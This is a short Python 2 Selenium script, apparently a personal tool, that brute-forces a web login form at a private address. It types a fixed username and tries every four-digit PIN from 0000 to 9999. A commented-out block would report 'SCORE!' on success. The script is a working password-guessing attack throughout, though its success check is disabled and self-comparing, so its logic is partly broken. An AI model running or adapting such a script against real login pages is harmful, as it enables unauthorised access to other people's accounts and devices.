#run_local.py
#by drh4kor
#inception date:2019-2-14

#get reference to the libraries
from selenium import webdriver
from selenium.webdriver.firefox.firefox_binary import FirefoxBinary

#set variables
loginURL='http://10.10.1.20/cgi-bin/login.cgi'
binaryPath='/usr/bin/firefox'
#create object
binary = FirefoxBinary(binaryPath)
#create browser
driver = webdriver.Firefox(firefox_binary=binary)
driver.implicitly_wait(60)

#navigate to log in page
driver.get(loginURL)
#get the textbox to login
inputElement_id = driver.find_element_by_name('login_id')
#get the textbox for password
inputElement_psw = driver.find_element_by_name('login_pwd')
#set the path to the link element does not have id or name property.
inputElement_link=driver.find_element_by_link_text('Login')

#setup counter variables
counter = 0
#setup initial value to test
psw_value=0000
#setup total number of tries
max_value = 10000
#show the current page path
print driver.current_url
currentURL=driver.current_url
#loop start at 0000
#simulate keys into the textbox
#inputElement_id.send_keys('Alma')

for x in range(0, max_value):
    #debug;show the counter
    print "Loop count %04d" % (x)
    #clear boxe
    inputElement_psw.clear()
    #todo: format x into '%3d'
    #simulate keys into the textbox
    psw_value=format(x,"04d")
    inputElement_psw.send_keys(psw_value)
    #input username and psw
    inputElement_id = driver.find_element_by_name('login_id')
    inputElement_id.send_keys('Alma')
    inputElement_psw = driver.find_element_by_name('login_pwd')
    inputElement_link=driver.find_element_by_xpath("//*[@id='btn_login']")
    #simulate click on the faux button
    inputElement_link.click()    
    #get the url from the page loaded
#    newURL = driver.current_url
    driver.implicitly_wait(30)
    print driver.current_url;
    currentURL="http://10.10.1.20/cgi-bin/login_proc.cgi"
    driver.get(currentURL)

#    #check if it's NOT the same
#    if currentURL != currentURL: 
#	#todo: write to log the test value that passed
#	print "SCORE!"
#        #gtfo
#        break	
#cleanup time
driver.close()
